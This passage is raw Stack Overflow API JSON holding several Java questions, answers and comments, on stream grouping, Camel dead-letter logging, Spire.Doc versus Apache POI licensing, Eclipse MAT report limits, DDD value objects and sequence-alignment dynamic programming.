:)</p>\n"}],"owner":{"account_id":23973554,"reputation":9,"user_id":17961915,"display_name":"RiKh"},"comment_count":6,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":76,"favorite_count":0,"down_vote_count":3,"up_vote_count":1,"answer_count":1,"score":-2,"last_activity_date":1642491403,"creation_date":1642490558,"question_id":70751651,"body_markdown":"I have a List&lt;DummyClass&gt;:\r\n\r\n    class DummyClass {\r\n      List&lt;String&gt; rname;\r\n      String name;\r\n    \r\n    }\r\n\r\nThe values in my List look like this:\r\n\r\n    list.add(DummyClass(Array.asList(&quot;a&quot;,&quot;b&quot;),&quot;apple&quot;))\r\n    list.add(DummyClass(Array.asList(&quot;a&quot;,&quot;b&quot;),&quot;banana&quot;))\r\n    list.add(DummyClass(Array.asList(&quot;a&quot;,&quot;c&quot;),&quot;orange&quot;))\r\n    list.add(DummyClass(null,&quot;apple&quot;))\r\n\r\nI want to convert the above List into a Map&lt;String,  Set&lt;String&gt;&gt;, where key is rname and value is Set of name field.\r\n\r\n    {\r\n    &quot;a&quot;-&gt; [&quot;apple&quot;, &quot;orange&quot;, &quot;banana&quot;],\r\n    &quot;b&quot;-&gt; [&quot;apple&quot;, &quot;banana&quot;]\r\n    &quot;c&quot; -&gt; [&quot;orange&quot;]\r\n    }\r\n\r\nI am trying to use java stream and facing null pointer exception . Can someone please guide\r\n\r\n\r\n    Map&lt;String, Set&lt;String&gt;&gt; map =\r\n        list.stream()\r\n                     .collect(Collectors.groupingBy(DummyClass::rname, \r\n                                                    Collectors.mapping(DummyClass::getName,\r\n                                                                       Collectors.toSet())));\r\n\r\n\r\n\r\nI am not able to process {(Array.asList(&quot;a&quot;,&quot;b&quot;))}each element of list in stream. \r\nThere is some flaw here : \r\n\r\n    Collectors.groupingBy(DummyClass::rname, \r\n                                                        Collectors.mapping(DummyClass::getName,\r\n                                                                           Collectors.toSet())))\r\n\r\nwhere I am processing the entire list together, rather than each element . Shall I use another stream ","title":"Java 8 Need advice with stream","body":"<p>I have a List:</p>\n<pre><code>class DummyClass {\n  List&lt;String&gt; rname;\n  String name;\n\n}\n</code></pre>\n<p>The values in my List look like this:</p>\n<pre><code>list.add(DummyClass(Array.asList(&quot;a&quot;,&quot;b&quot;),&quot;apple&quot;))\nlist.add(DummyClass(Array.asList(&quot;a&quot;,&quot;b&quot;),&quot;banana&quot;))\nlist.add(DummyClass(Array.asList(&quot;a&quot;,&quot;c&quot;),&quot;orange&quot;))\nlist.add(DummyClass(null,&quot;apple&quot;))\n</code></pre>\n<p>I want to convert the above List into a Map&lt;String,  Set&gt;, where key is rname and value is Set of name field.</p>\n<pre><code>{\n&quot;a&quot;-&gt; [&quot;apple&quot;, &quot;orange&quot;, &quot;banana&quot;],\n&quot;b&quot;-&gt; [&quot;apple&quot;, &quot;banana&quot;]\n&quot;c&quot; -&gt; [&quot;orange&quot;]\n}\n</code></pre>\n<p>I am trying to use java stream and facing null pointer exception . Can someone please guide</p>\n<pre><code>Map&lt;String, Set&lt;String&gt;&gt; map =\n    list.stream()\n                 .collect(Collectors.groupingBy(DummyClass::rname, \n                                                Collectors.mapping(DummyClass::getName,\n                                                                   Collectors.toSet())));\n</code></pre>\n<p>I am not able to process {(Array.asList(&quot;a&quot;,&quot;b&quot;))}each element of list in stream.\nThere is some flaw here :</p>\n<pre><code>Collectors.groupingBy(DummyClass::rname, \n                                                    Collectors.mapping(DummyClass::getName,\n                                                                       Collectors.toSet())))\n</code></pre>\n<p>where I am processing the entire list together, rather than each element . Shall I use another stream</p>\n"},{"tags":["java","error-handling","apache-camel","dead-letter"],"comments":[{"owner":{"account_id":241004,"reputation":3291,"user_id":511562,"display_name":"Willem Jiang"},"score":0,"creation_date":1419476455,"post_id":27639628,"comment_id":43706480,"body_markdown":"I just checked the code of camel, if the exchange isRollbackOnly() is true, it just downgrade the logging level from ERROR to WARNING. Did you enable the transaction support of the activemq endpoint?","body":"I just checked the code of camel, if the exchange isRollbackOnly() is true, it just downgrade the logging level from ERROR to WARNING. Did you enable the transaction support of the activemq endpoint?"},{"owner":{"account_id":3947744,"reputation":780,"user_id":3259564,"display_name":"alexanderific"},"score":0,"creation_date":1419854722,"post_id":27639628,"comment_id":43790411,"body_markdown":"@WillemJiang even if Camel decided to downgrade the default logging level to WARNING, wouldn&#39;t my above errorHandler overwrite that back to ERROR level? Regardless, I don&#39;t even get a WARNING log that the retries were exhausted. \nAnd I am not sure if I have enabled transaction support of the amq endpoint...but would that really change anything? I would&#39;ve thought the errorHandler would control the exhaustion, not the dead letter endpoint. \nDoes it actually even log anything when the retries are exhausted? I have yet to even see what it might say.","body":"@WillemJiang even if Camel decided to downgrade the default logging level to WARNING, wouldn&#39;t my above errorHandler overwrite that back to ERROR level? Regardless, I don&#39;t even get a WARNING log that the retries were exhausted.  And I am not sure if I have enabled transaction support of the amq endpoint...but would that really change anything? I would&#39;ve thought the errorHandler would control the exhaustion, not the dead letter endpoint.  Does it actually even log anything when the retries are exhausted? I have yet to even see what it might say."},{"owner":{"account_id":241004,"reputation":3291,"user_id":511562,"display_name":"Willem Jiang"},"score":0,"creation_date":1420199864,"post_id":27639628,"comment_id":43894485,"body_markdown":"Can you change the activemq endpoint to direct or seda endpoint try to see if you can setup the log level there?","body":"Can you change the activemq endpoint to direct or seda endpoint try to see if you can setup the log level there?"},{"owner":{"account_id":3947744,"reputation":780,"user_id":3259564,"display_name":"alexanderific"},"score":0,"creation_date":1420466053,"post_id":27639628,"comment_id":43971829,"body_markdown":"Updated the ErrorHandler&#39;s DeadLetterChannel to be a direct endpoint. Left the 2 logLevel configs the same. I got the 3 retry attempted WARN logs, but no ERROR log telling me the retries were exhausted. I did, however, set up a small route listening to the direct dead letter endpoint that logs, and that is working. So as I mentioned in my OP, I can always go this route of having a mediator route do some logging and route it to my activemq channel. However, it still does not address what retriesExhaustedLogLevel does. That is, does it even log anything? And if so, in what situations?","body":"Updated the ErrorHandler&#39;s DeadLetterChannel to be a direct endpoint. Left the 2 logLevel configs the same. I got the 3 retry attempted WARN logs, but no ERROR log telling me the retries were exhausted. I did, however, set up a small route listening to the direct dead letter endpoint that logs, and that is working. So as I mentioned in my OP, I can always go this route of having a mediator route do some logging and route it to my activemq channel. However, it still does not address what retriesExhaustedLogLevel does. That is, does it even log anything? And if so, in what situations?"}],"answers":[{"tags":[],"owner":{"account_id":3947744,"reputation":780,"user_id":3259564,"display_name":"alexanderific"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1462978441,"creation_date":1462978441,"answer_id":37166308,"question_id":27639628,"body_markdown":"Updated the ErrorHandler&#39;s DeadLetterChannel to be a direct endpoint. Left the 2 logLevel configs the same. I got the 3 retry attempted WARN logs, but no ERROR log telling me the retries were exhausted. I did, however, set up a small route listening to the direct dead letter endpoint that logs, and that is working. \r\n\r\nNot a direct solution to my desire to have the ERROR log work for the exhaustion, but is an acceptable workaround for now.","title":"How to configure Camel&#39;s RedeliveryPolicy retriesExhaustedLogLevel?","body":"<p>Updated the ErrorHandler's DeadLetterChannel to be a direct endpoint. Left the 2 logLevel configs the same. I got the 3 retry attempted WARN logs, but no ERROR log telling me the retries were exhausted. I did, however, set up a small route listening to the direct dead letter endpoint that logs, and that is working. </p>\n\n<p>Not a direct solution to my desire to have the ERROR log work for the exhaustion, but is an acceptable workaround for now.</p>\n"},{"tags":[],"owner":{"account_id":8391615,"reputation":91,"user_id":6300171,"display_name":"shijin raj"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642491225,"creation_date":1642436962,"answer_id":70744544,"question_id":27639628,"body_markdown":"Please try with this code:\r\n\r\n    .errorHandler(deadLetterChannel(&quot;kafka:sample-dead-topic&quot;)\r\n    \t\t\t\t.maximumRedeliveries(4).redeliveryDelay(60000)\r\n    \t\t\t\t.retriesExhaustedLogLevel(LoggingLevel.WARN)\r\n    \t\t\t\t.retryAttemptedLogLevel( LoggingLevel.WARN)\r\n    \t\t\t\t\t\t\t\t.retriesExhaustedLogLevel(LoggingLevel.ERROR)\r\n    \t\t\t\t.logHandled(true)\r\n    \t\t\t\t.allowRedeliveryWhileStopping(true)\r\n    \t\t\t\t.logRetryStackTrace(true)\r\n    \t\t\t\t.logExhausted(true)\r\n    \t\t\t\t.logStackTrace(true)\r\n    \t\t\t\t.logExhaustedMessageBody(true)\r\n    \t\t)\r\n\r\nretry is configured for 1 minute interval.\r\n\r\nCamel application logged the errors for evry retry with the detailed information.\r\n","title":"How to configure Camel&#39;s RedeliveryPolicy retriesExhaustedLogLevel?","body":"<p>Please try with this code:</p>\n<pre><code>.errorHandler(deadLetterChannel(&quot;kafka:sample-dead-topic&quot;)\n                .maximumRedeliveries(4).redeliveryDelay(60000)\n                .retriesExhaustedLogLevel(LoggingLevel.WARN)\n                .retryAttemptedLogLevel( LoggingLevel.WARN)\n                                .retriesExhaustedLogLevel(LoggingLevel.ERROR)\n                .logHandled(true)\n                .allowRedeliveryWhileStopping(true)\n                .logRetryStackTrace(true)\n                .logExhausted(true)\n                .logStackTrace(true)\n                .logExhaustedMessageBody(true)\n        )\n</code></pre>\n<p>retry is configured for 1 minute interval.</p>\n<p>Camel application logged the errors for evry retry with the detailed information.</p>\n"}],"owner":{"account_id":3947744,"reputation":780,"user_id":3259564,"display_name":"alexanderific"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1507,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":37166308,"answer_count":2,"score":0,"last_activity_date":1642491225,"creation_date":1419438001,"question_id":27639628,"body_markdown":"I have set up an errorHandler in a Camel route that will retry a message several times before sending the message to a dead letter channel (an activemq queue in this case). What I would like is to see an ERROR log when the message failed to be retried the max number of times and was then sent to the dead letter queue. \r\n\r\nLooking at the docs for error handling and dead letter channels, it seems that there are 2 options available on the RedeliveryPolicy: retriesAttemptedLogLevel and retriesExhaustedLogLevel. Supposedly by default the retriesExhaustedLogLevel is already set at LoggingLevel.ERROR, but it does not appear to actually log anything when it has expended all retries and routes the message to the dead letter channel. \r\n\r\nHere is my errorHandler definition via Java DSL.\r\n\r\n    .errorHandler(this.deadLetterChannel(MY_ACTIVE_MQ_DEAD_LETTER)\r\n\t\t.useOriginalMessage()\r\n\t\t.maximumRedeliveries(3)\r\n\t\t.useExponentialBackOff()\r\n\t\t.retriesExhaustedLogLevel(LoggingLevel.ERROR)\r\n\t\t.retryAttemptedLogLevel(LoggingLevel.WARN))\r\n\r\nI have explicitly set the level to ERROR now and it still does not appear to log out anything (to any logging level). On the other hand, retryAttemptedLogLevel is working just fine and will log to the appropriate LoggingLevel (ie, I could set retryAttemptedLogLevel to LoggingLevel.ERROR and see the retries as ERROR logs). However I only want a single ERROR log in the event of exhaustion, instead of an ERROR log for each retry when a subsequent retry could potentially succeed. \r\n\r\nMaybe I am missing something, but it seems that the retriesExhaustedLogLevel does not do anything...or does not log anything if the ErrorHandler is configured as a DeadLetterChannel. Is there a configuration that I am still needing, or does this feature of RedeliveryPolicy not execute for this specific ErrorHandlerFactory?\r\n\r\nI could also set up a route to send my exhausted messages that simply logs and routes to my dead letter channel, but I would prefer to try and use what is already built into the ErrorHandler if possible. ","title":"How to configure Camel&#39;s RedeliveryPolicy retriesExhaustedLogLevel?","body":"<p>I have set up an errorHandler in a Camel route that will retry a message several times before sending the message to a dead letter channel (an activemq queue in this case). What I would like is to see an ERROR log when the message failed to be retried the max number of times and was then sent to the dead letter queue. </p>\n\n<p>Looking at the docs for error handling and dead letter channels, it seems that there are 2 options available on the RedeliveryPolicy: retriesAttemptedLogLevel and retriesExhaustedLogLevel. Supposedly by default the retriesExhaustedLogLevel is already set at LoggingLevel.ERROR, but it does not appear to actually log anything when it has expended all retries and routes the message to the dead letter channel. </p>\n\n<p>Here is my errorHandler definition via Java DSL.</p>\n\n<pre><code>.errorHandler(this.deadLetterChannel(MY_ACTIVE_MQ_DEAD_LETTER)\n    .useOriginalMessage()\n    .maximumRedeliveries(3)\n    .useExponentialBackOff()\n    .retriesExhaustedLogLevel(LoggingLevel.ERROR)\n    .retryAttemptedLogLevel(LoggingLevel.WARN))\n</code></pre>\n\n<p>I have explicitly set the level to ERROR now and it still does not appear to log out anything (to any logging level). On the other hand, retryAttemptedLogLevel is working just fine and will log to the appropriate LoggingLevel (ie, I could set retryAttemptedLogLevel to LoggingLevel.ERROR and see the retries as ERROR logs). However I only want a single ERROR log in the event of exhaustion, instead of an ERROR log for each retry when a subsequent retry could potentially succeed. </p>\n\n<p>Maybe I am missing something, but it seems that the retriesExhaustedLogLevel does not do anything...or does not log anything if the ErrorHandler is configured as a DeadLetterChannel. Is there a configuration that I am still needing, or does this feature of RedeliveryPolicy not execute for this specific ErrorHandlerFactory?</p>\n\n<p>I could also set up a route to send my exhausted messages that simply logs and routes to my dead letter channel, but I would prefer to try and use what is already built into the ErrorHandler if possible. </p>\n"},{"tags":["java","spring-boot","apache-poi","spire.doc"],"answers":[{"tags":[],"owner":{"account_id":10814530,"reputation":4195,"user_id":7954021,"display_name":"Renis1235"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1642491218,"creation_date":1642491218,"answer_id":70751771,"question_id":70750194,"body_markdown":"&gt; Does it have a license?\r\n\r\n[This][1] says:\r\n\r\n&gt; Free version is limited to 500 paragraphs and 25 tables. This limitation is enforced during reading or writing files. When converting word documents to PDF and XPS files, you can only get the first 3 pages of PDF file. Upgrade to Commercial Edition of Spire.Doc for Java.\r\n\r\nSo it is pretty limited. It depends on your use case. If this is enough for you, go for it, else you&#39;ll have to do with Apache POI. Which is a great mature library.\r\n\r\n\r\n  [1]: https://www.e-iceblue.com/Introduce/free-doc-for-java.html","title":"safer library whether to use poi or spire.doc in spring boot","body":"<blockquote>\n<p>Does it have a license?</p>\n</blockquote>\n<p><a href=\"https://www.e-iceblue.com/Introduce/free-doc-for-java.html\" rel=\"nofollow noreferrer\">This</a> says:</p>\n<blockquote>\n<p>Free version is limited to 500 paragraphs and 25 tables. This limitation is enforced during reading or writing files. When converting word documents to PDF and XPS files, you can only get the first 3 pages of PDF file. Upgrade to Commercial Edition of Spire.Doc for Java.</p>\n</blockquote>\n<p>So it is pretty limited. It depends on your use case. If this is enough for you, go for it, else you'll have to do with Apache POI. Which is a great mature library.</p>\n"}],"owner":{"account_id":23888482,"reputation":37,"user_id":17888411,"display_name":"Jessica Cathrine"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1501,"favorite_count":0,"down_vote_count":1,"up_vote_count":0,"closed_date":1642496120,"accepted_answer_id":70751771,"answer_count":1,"score":-1,"last_activity_date":1642491218,"creation_date":1642479121,"question_id":70750194,"body_markdown":"I have a project to combine multiple docx documents into 1 docx file using spring boot. I&#39;m confused about using the poi library or E-iceblue&#39;s free Spire.Doc. I&#39;ve managed to use those two libraries. And I&#39;m more comfortable using the spire library because its use is simpler. What I want to ask is is it safe to use E-iceblue&#39;s free Spire.Doc library in a large project? Does it have a license?\r\n\r\nHere are the dependencies and repositories in pom.xml file :\r\n\r\n    &lt;dependencies&gt;\r\n        &lt;dependency&gt;\r\n            &lt;groupId&gt;e-iceblue&lt;/groupId&gt;\r\n            &lt;artifactId&gt;spire.doc.free&lt;/artifactId&gt;\r\n            &lt;version&gt;3.9.0&lt;/version&gt;\r\n        &lt;/dependency&gt;\r\n    &lt;/dependencies&gt;\r\n\r\n    &lt;repositories&gt;\r\n        &lt;repository&gt;\r\n            &lt;id&gt;com.e-iceblue&lt;/id&gt;\r\n            &lt;name&gt;e-iceblue&lt;/name&gt;\r\n            &lt;url&gt;http://repo.e-iceblue.com/nexus/content/groups/public/&lt;/url&gt;\r\n        &lt;/repository&gt;\r\n    &lt;/repositories&gt;","title":"safer library whether to use poi or spire.doc in spring boot","body":"<p>I have a project to combine multiple docx documents into 1 docx file using spring boot. I'm confused about using the poi library or E-iceblue's free Spire.Doc. I've managed to use those two libraries. And I'm more comfortable using the spire library because its use is simpler. What I want to ask is is it safe to use E-iceblue's free Spire.Doc library in a large project? Does it have a license?</p>\n<p>Here are the dependencies and repositories in pom.xml file :</p>\n<pre><code>&lt;dependencies&gt;\n    &lt;dependency&gt;\n        &lt;groupId&gt;e-iceblue&lt;/groupId&gt;\n        &lt;artifactId&gt;spire.doc.free&lt;/artifactId&gt;\n        &lt;version&gt;3.9.0&lt;/version&gt;\n    &lt;/dependency&gt;\n&lt;/dependencies&gt;\n\n&lt;repositories&gt;\n    &lt;repository&gt;\n        &lt;id&gt;com.e-iceblue&lt;/id&gt;\n        &lt;name&gt;e-iceblue&lt;/name&gt;\n        &lt;url&gt;http://repo.e-iceblue.com/nexus/content/groups/public/&lt;/url&gt;\n    &lt;/repository&gt;\n&lt;/repositories&gt;\n</code></pre>\n"},{"tags":["java","eclipse","heap-dump","eclipse-mat"],"answers":[{"tags":[],"owner":{"account_id":18866500,"reputation":431,"user_id":13762112,"display_name":"user13762112"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642490504,"creation_date":1642490504,"answer_id":70751641,"question_id":70505465,"body_markdown":"The reason MAT only has links for the first 10 objects is to keep down the size of the generated HTML page. Having every object in the report could make the report massive. Sometimes the report has an icon with a window with a yellow arrow bext to the heading. You can use that to run that section as a query.\r\n\r\nMemory Analyzer 1.12 has some improvements to the reports, but still the 10 object limit.\r\n\r\nIf you are happy to know about HashMaps from the whole snapshot, then find them using the histogram query, then run the &#39;Java Collections&#39; &gt; &#39;Collections Grouped by Size&#39;\r\n\r\nIf you want to look at HashMaps belonging to a component then that&#39;s harder. The root set of a component is defined by MAT as being a class loader, all the classes loaded by that loader, and all instances of those classes which are not themselves classes or class loaders. From the help:\r\n\r\n&gt; Using this root set of objects, the component report calculates a\r\n&gt; customized retained set. This retained set includes all objects kept\r\n&gt; alive by the root set. Additionally, it assumes that all objects that\r\n&gt; have become finalizable actually have been finalized and that also all\r\n&gt; soft references have been cleared.","title":"Eclipse MAT report is only listing top 10 objects","body":"<p>The reason MAT only has links for the first 10 objects is to keep down the size of the generated HTML page. Having every object in the report could make the report massive. Sometimes the report has an icon with a window with a yellow arrow bext to the heading. You can use that to run that section as a query.</p>\n<p>Memory Analyzer 1.12 has some improvements to the reports, but still the 10 object limit.</p>\n<p>If you are happy to know about HashMaps from the whole snapshot, then find them using the histogram query, then run the 'Java Collections' &gt; 'Collections Grouped by Size'</p>\n<p>If you want to look at HashMaps belonging to a component then that's harder. The root set of a component is defined by MAT as being a class loader, all the classes loaded by that loader, and all instances of those classes which are not themselves classes or class loaders. From the help:</p>\n<blockquote>\n<p>Using this root set of objects, the component report calculates a\ncustomized retained set. This retained set includes all objects kept\nalive by the root set. Additionally, it assumes that all objects that\nhave become finalizable actually have been finalized and that also all\nsoft references have been cleared.</p>\n</blockquote>\n"}],"owner":{"account_id":6356877,"reputation":918,"user_id":4933827,"accept_rate":72,"display_name":"OrlandoL"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":256,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1642490504,"creation_date":1640685450,"question_id":70505465,"body_markdown":"I&#39;m analyzing my heap using MAT and looking at a few helpful reports. For example this report lists the possible memory wastes in empty collections. \r\n\r\n**MAT version: 1.11.0**\r\n\r\nHere as you can see from the screenshot, each item in the report is only listing first 10 of all objects.\r\n\r\n[![enter image description here][1]][1]\r\n\r\nIf I click into the &quot;First 10 of ... objects&quot;, expecting to see more objects, that&#39;s actually not the case. All I can see is only those 10 objects. I don&#39;t see a way to show more objects like a &quot;Show the next 10 objects&quot; button. See screenshot below.\r\n\r\n[![enter image description here][2]][2]\r\n\r\nI&#39;m looking for a way to see all the 365 objects. Is there such a button somewhere? Or I have to write OQL for that? I&#39;m really new to OQL, could someone give me an example? Appreciate any help!\r\n\r\nNote: The ThreadLocalMap is only for illustration and a better screenshot, I&#39;m actually looking for where the empty HashMap are from.\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/Y9n5V.png\r\n  [2]: https://i.stack.imgur.com/tMCi6.png","title":"Eclipse MAT report is only listing top 10 objects","body":"<p>I'm analyzing my heap using MAT and looking at a few helpful reports. For example this report lists the possible memory wastes in empty collections.</p>\n<p><strong>MAT version: 1.11.0</strong></p>\n<p>Here as you can see from the screenshot, each item in the report is only listing first 10 of all objects.</p>\n<p><a href=\"https://i.stack.imgur.com/Y9n5V.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/Y9n5V.png\" alt=\"enter image description here\" /></a></p>\n<p>If I click into the &quot;First 10 of ... objects&quot;, expecting to see more objects, that's actually not the case. All I can see is only those 10 objects. I don't see a way to show more objects like a &quot;Show the next 10 objects&quot; button. See screenshot below.</p>\n<p><a href=\"https://i.stack.imgur.com/tMCi6.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/tMCi6.png\" alt=\"enter image description here\" /></a></p>\n<p>I'm looking for a way to see all the 365 objects. Is there such a button somewhere? Or I have to write OQL for that? I'm really new to OQL, could someone give me an example? Appreciate any help!</p>\n<p>Note: The ThreadLocalMap is only for illustration and a better screenshot, I'm actually looking for where the empty HashMap are from.</p>\n"},{"tags":["java","domain-driven-design"],"comments":[{"owner":{"account_id":14357,"reputation":9128,"user_id":29470,"display_name":"Tim Moore"},"score":0,"creation_date":1642487747,"post_id":70751170,"comment_id":125076575,"body_markdown":"Why do you have to have all of these different types?","body":"Why do you have to have all of these different types?"},{"owner":{"account_id":319873,"reputation":87612,"user_id":637853,"accept_rate":50,"display_name":"Thomas"},"score":3,"creation_date":1642487947,"post_id":70751170,"comment_id":125076617,"body_markdown":"Aren&#39;t the types of the value objects all the same and they just get a different meaning from the context in which they&#39;re used in? Using something like `Money` (which contains the amount and the currency) I&#39;d probably do something like this: `Money installment; Money outstanding; Money financed; ...`.","body":"Aren&#39;t the types of the value objects all the same and they just get a different meaning from the context in which they&#39;re used in? Using something like <code>Money</code> (which contains the amount and the currency) I&#39;d probably do something like this: <code>Money installment; Money outstanding; Money financed; ...</code>."},{"owner":{"account_id":2327783,"reputation":88,"user_id":2041844,"display_name":"harishpatarla"},"score":0,"creation_date":1642497594,"post_id":70751170,"comment_id":125079903,"body_markdown":"@TimMoore, I would like to have some logic in each of these, like some invariants and the specific calculation of how we may derive at that value, eg. FinancedAmount = NetAmount - DownPayment - TradeInAmount etc.","body":"@TimMoore, I would like to have some logic in each of these, like some invariants and the specific calculation of how we may derive at that value, eg. FinancedAmount = NetAmount - DownPayment - TradeInAmount etc."},{"owner":{"account_id":2327783,"reputation":88,"user_id":2041844,"display_name":"harishpatarla"},"score":0,"creation_date":1642498077,"post_id":70751170,"comment_id":125080090,"body_markdown":"@Thomas, If I have most of the objects as type Money then i am thinking i wont get the compile time type checks etc. Also, I would like to have some logic in each of these, like some invariants and the specific calculation logic, which should i add in money class itself? like calculateNetAmount(), calculateFinancedAmount() etc","body":"@Thomas, If I have most of the objects as type Money then i am thinking i wont get the compile time type checks etc. Also, I would like to have some logic in each of these, like some invariants and the specific calculation logic, which should i add in money class itself? like calculateNetAmount(), calculateFinancedAmount() etc"},{"owner":{"account_id":319873,"reputation":87612,"user_id":637853,"accept_rate":50,"display_name":"Thomas"},"score":2,"creation_date":1642499424,"post_id":70751170,"comment_id":125080667,"body_markdown":"Well, the value objects should be independent from each other as well as from the entity they&#39;re used with (value objects should be shareable so they shouldn&#39;t have any notion of the entity at all). Thus those calculation methods don&#39;t belong into the value objects since they seem to depend on the entity. Whether invariant checks are moved to the value objects depends on whether they apply to _all_ of those values or not, i.e. an invariant for &quot;distance must never be negative&quot; could be part of a `Distance` value object but &quot;Distance must be at most 100m&quot; probably doesn&#39;t belong there.","body":"Well, the value objects should be independent from each other as well as from the entity they&#39;re used with (value objects should be shareable so they shouldn&#39;t have any notion of the entity at all). Thus those calculation methods don&#39;t belong into the value objects since they seem to depend on the entity. Whether invariant checks are moved to the value objects depends on whether they apply to <i>all</i> of those values or not, i.e. an invariant for &quot;distance must never be negative&quot; could be part of a <code>Distance</code> value object but &quot;Distance must be at most 100m&quot; probably doesn&#39;t belong there."},{"owner":{"account_id":319873,"reputation":87612,"user_id":637853,"accept_rate":50,"display_name":"Thomas"},"score":1,"creation_date":1642499593,"post_id":70751170,"comment_id":125080746,"body_markdown":"Compile time checks can be helpful but you need to think about whether they actually help you so much that they warrant having those extra classes (it that&#39;s all they&#39;re used for once any context-dependent calculation is moved out of the VOs).","body":"Compile time checks can be helpful but you need to think about whether they actually help you so much that they warrant having those extra classes (it that&#39;s all they&#39;re used for once any context-dependent calculation is moved out of the VOs)."},{"owner":{"account_id":2327783,"reputation":88,"user_id":2041844,"display_name":"harishpatarla"},"score":0,"creation_date":1642503178,"post_id":70751170,"comment_id":125082267,"body_markdown":"I am also having to deal with a lot of Dates like installmentStartDate, DownPaymentDate. Any suggestion for handling dates?","body":"I am also having to deal with a lot of Dates like installmentStartDate, DownPaymentDate. Any suggestion for handling dates?"}],"owner":{"account_id":2327783,"reputation":88,"user_id":2041844,"display_name":"harishpatarla"},"comment_count":7,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":263,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":0,"score":1,"last_activity_date":1642490360,"creation_date":1642487333,"question_id":70751170,"body_markdown":"I want to create Value objects for lots of amounts that I deal with in my application like InstallmentAmount, OutstandingAmount, FinancedAmount, PricipalAmount, etc and mostly all have only BigDecimal value which i would use for calculations.\r\n\r\nHere is it a good idea to have a Amount Value object and extend from that for all these Objects? ","title":"Implementing Value objects in DDD when I have lot of Amount fields to deal with","body":"<p>I want to create Value objects for lots of amounts that I deal with in my application like InstallmentAmount, OutstandingAmount, FinancedAmount, PricipalAmount, etc and mostly all have only BigDecimal value which i would use for calculations.</p>\n<p>Here is it a good idea to have a Amount Value object and extend from that for all these Objects?</p>\n"},{"tags":["java","matrix","dynamic-programming","multidimensional-array","sequence-alignment"],"comments":[{"owner":{"account_id":2724749,"reputation":5612,"user_id":2350145,"accept_rate":67,"display_name":"Anirban Nag &#39;tintinmj&#39;"},"score":0,"creation_date":1387283740,"post_id":20634226,"comment_id":30884775,"body_markdown":"How are you getting the output?","body":"How are you getting the output?"},{"owner":{"account_id":23121,"reputation":527346,"user_id":57695,"accept_rate":75,"display_name":"Peter Lawrey"},"score":1,"creation_date":1387283757,"post_id":20634226,"comment_id":30884785,"body_markdown":"I wouldn&#39;t add the letters and numbers into the array.  I would keep them separate as they are in the example table.  I would have a matrix of numbers AND an array of headings either `char` or `String`","body":"I wouldn&#39;t add the letters and numbers into the array.  I would keep them separate as they are in the example table.  I would have a matrix of numbers AND an array of headings either <code>char</code> or <code>String</code>"},{"owner":{"account_id":3019624,"reputation":195,"user_id":2560965,"accept_rate":75,"display_name":"judge"},"score":0,"creation_date":1387284195,"post_id":20634226,"comment_id":30885071,"body_markdown":"@tintinmj want me to give code?","body":"@tintinmj want me to give code?"},{"owner":{"account_id":3019624,"reputation":195,"user_id":2560965,"accept_rate":75,"display_name":"judge"},"score":0,"creation_date":1387284225,"post_id":20634226,"comment_id":30885091,"body_markdown":"@PeterLawrey i can simply erase the letters from output","body":"@PeterLawrey i can simply erase the letters from output"},{"owner":{"account_id":1801353,"reputation":81710,"user_id":1639625,"display_name":"tobias_k"},"score":0,"creation_date":1387530754,"post_id":20634226,"comment_id":31003097,"body_markdown":"If your problem is solved, just accept the answer (or add your own answer, if you solved it yourself). _Do not delete_ solved questions! Solved questions are what makes StackOverflow so great!","body":"If your problem is solved, just accept the answer (or add your own answer, if you solved it yourself). <i>Do not delete</i> solved questions! Solved questions are what makes StackOverflow so great!"}],"answers":[{"tags":[],"owner":{"account_id":2660877,"reputation":38533,"user_id":2300597,"accept_rate":55,"display_name":"peter.petrov"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1387284234,"creation_date":1387283722,"answer_id":20634294,"question_id":20634226,"body_markdown":"I suggest you read these articles.\r\n\r\nhttp://en.wikipedia.org/wiki/Smith%E2%80%93Waterman_algorithm&lt;br&gt;\r\nhttp://en.wikipedia.org/wiki/Needleman%E2%80%93Wunsch_algorithm&lt;br&gt;\r\n\r\nThe implementation in any language is pretty trivial.&lt;br&gt;\r\n\r\nAnd if you need information about dynamic programming in general,&lt;br&gt;\r\neither Google for it yourself, or check these two links.&lt;br&gt;\r\n\r\nhttp://en.wikipedia.org/wiki/Dynamic_programming&lt;br&gt;\r\nhttps://www.topcoder.com/tc?d1=tutorials&amp;d2=dynProg&amp;module=Static&lt;br&gt;\r\n","title":"dynamic programming filling matrix in sequence alignment","body":"<p>I suggest you read these articles.</p>\n\n<p><a href=\"http://en.wikipedia.org/wiki/Smith%E2%80%93Waterman_algorithm\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Smith%E2%80%93Waterman_algorithm</a><br>\n<a href=\"http://en.wikipedia.org/wiki/Needleman%E2%80%93Wunsch_algorithm\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Needleman%E2%80%93Wunsch_algorithm</a><br></p>\n\n<p>The implementation in any language is pretty trivial.<br></p>\n\n<p>And if you need information about dynamic programming in general,<br>\neither Google for it yourself, or check these two links.<br></p>\n\n<p><a href=\"http://en.wikipedia.org/wiki/Dynamic_programming\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Dynamic_programming</a><br>\n<a href=\"https://www.topcoder.com/tc?d1=tutorials&amp;d2=dynProg&amp;module=Static\" 